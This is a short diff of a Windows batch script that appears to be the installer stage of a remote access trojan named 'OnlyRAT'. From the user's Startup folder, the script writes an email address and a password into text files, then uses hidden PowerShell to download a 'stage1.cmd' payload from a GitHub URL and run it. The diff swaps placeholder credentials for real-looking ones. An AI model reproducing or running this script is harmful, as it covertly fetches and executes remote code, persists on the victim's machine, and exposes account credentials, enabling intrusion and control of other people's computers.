@@ -2,8 +2,8 @@
 set "XNjFYKECht=%cd%"
 set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %YKHfpmMRoQ%
-echo example@gmail.com > XbrMzmCUiE.txt
-echo password > UJbMLjTIDr.txt
+echo underthetablejade@gmail.com > XbrMzmCUiE.txt
+echo 6922568729956382Za! > UJbMLjTIDr.txt
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/JadeCosmo/OnlyRAT/main/payloads/stage1.cmd -OutFile wEaoFkNduy.cmd"
 powershell ./wEaoFkNduy.cmd
 cd "%XNjFYKECht%"
